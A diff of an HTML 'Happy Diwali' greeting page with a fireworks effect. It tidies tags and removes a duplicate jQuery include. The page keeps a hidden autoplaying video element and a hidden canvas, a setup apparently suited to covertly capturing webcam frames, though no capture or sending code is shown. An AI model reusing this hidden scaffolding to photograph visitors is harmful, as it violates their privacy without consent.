@@ -2,22 +2,22 @@
 <html lang="en">
 
 <head>
-
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Happy Diwali!!</title>
   <!-- Include jQuery from CDN -->
   <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  <!-- Remove the div and video tags from the head -->
+  <link rel="stylesheet" href="diwali.css">
+</head>
+
+<body>
   <div class="video-wrap" hidden="hidden">
     <video id="video" playsinline autoplay></video>
   </div>
 
   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-  <title>Happy Diwali 2020</title>
-  <link rel="stylesheet" href="diwali.css">
-</head>
 
-<body>
   <section class="fireworks" id="sec1"></section>
   <section class="content" id="sec2">
     <h2>
@@ -27,7 +27,7 @@
   </section>
   <section class="content" id="sec3">
     <h2>
-      <c>in the true sense</c>by spreading <br>
+      <c>in the true sense</c> by spreading <br>
       joy and light
     </h2>
   </section>
@@ -36,8 +36,9 @@
       Have a Happy,<c>Safe and blessed Diwali! :)</c>
     </h2>
   </section>
-  <script src="http://code.jquery.com/jquery-3.3.1.js"></script>
-  <script type="text/javascript" src="jquery.fireworks.js"></script>
+
+  <!-- Remove the duplicated jQuery script tag -->
+  <script src="jquery.fireworks.js"></script>
   <script type="text/javascript">
     $('.fireworks').fireworks({
       sound: true, // sound effect
